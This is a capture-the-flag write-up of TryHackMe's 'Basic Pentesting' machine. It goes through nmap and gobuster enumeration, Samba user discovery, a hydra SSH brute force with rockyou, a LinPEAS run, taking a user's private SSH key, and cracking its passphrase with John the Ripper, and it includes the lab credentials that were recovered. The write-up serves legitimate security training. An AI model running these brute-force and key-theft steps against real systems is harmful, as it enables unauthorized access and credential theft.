# Basic Pentesting Machine from Try Hack Me

## Nmap
`nmap -sVC <targetipaddress>`

Ports:
22
80
And a couple of samba ports that are open. (139, 445)

## HTTP
First I take a look at the http port and head over to the webpage.

Did not get much from the inspect tool.
Checked for /robots.txt and /admin. 

## gobuster
`gobuster -u http://<targetipaddress> -w /usr/share/SecLists/Discovery/Web-Content/common.txt`

Results:
/.htpasswd            (Status: 403) [Size: 297]
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/development          (Status: 301) [Size: 320] [--> http://10.10.235.114/development/]
/index.html           (Status: 200) [Size: 158]
/server-status        (Status: 403) [Size: 301]

From here I checked out the /development directory 
checked both **dev.txt** and **j.txt**; j.txt we can see J talking to K and we notice that Kk has a weak password that we can use to find and take advantage of. 

Users:
J adn K are the two users we know exist in the machine thus far. Can use samaba to confirm this and get the usernames.

## [samba] (https://github.com/mksiki/notes/blob/main/samba.md)
`/usr/share/enum4linux/enum4linux.pl -a 10.10.235.114 `

Results:
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

## hydra 
`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.235.114`

Results:
[22][ssh] host: 10.10.235.114   login: jan   password: armando

## SSH

While in SSH most of the stuff I did not have permssion to read and nothing of use. 
I did find another directory in /home, **kay**. 
Had a pass.bk files that I did not have permission to **cat**. Other files were the same.

To escalte this procces I will use linpeas.

### LinPEAS (Linux Privilege Escalation Awesome Script)
First I coped the linpeas.sh to **jan** machine. 
`scp ./linpeas.sh jan@<targetipaddress>:/dev/shm`

From Jan's computer:
`cd /dev/shm`
`./linpeas.sh`

Results:
══╣ Possible private SSH keys were found!
/home/kay/.ssh/id_rsa

under **kay** /.ssh directory they have an SSH key that we can use to login using that user. 

`cd /home/kay/.ssh/`
`cat id_rsa`

Copy and paste that into my macine using vim and saving it(`chmod 600 kay_id_rsa`). 

### SSH kay's machine

Prompted to enter passphrase for **kay's** key. 

To figure out this passphrase I used JohnTheRipper. 

John the Ripper can crack an SSH key passphrase by first converting the private key into a 
format John understands using ssh2john and then running a brute-force or wordlist attack.

Save the hash key to a format John undesrtands:
`/usr/share/john/ssh2john.py kay_id_rsa > key.txt`

Run `john --wordlist=/usr/share/wordlists/rockyou.txt key.txt` 

Results:
beeswax          (kay_id_rsa)

`ssh -i kay_id_rsa kay@<targetipaddress>`

Entered passphrase:
`ls`
`cat pass.bak`
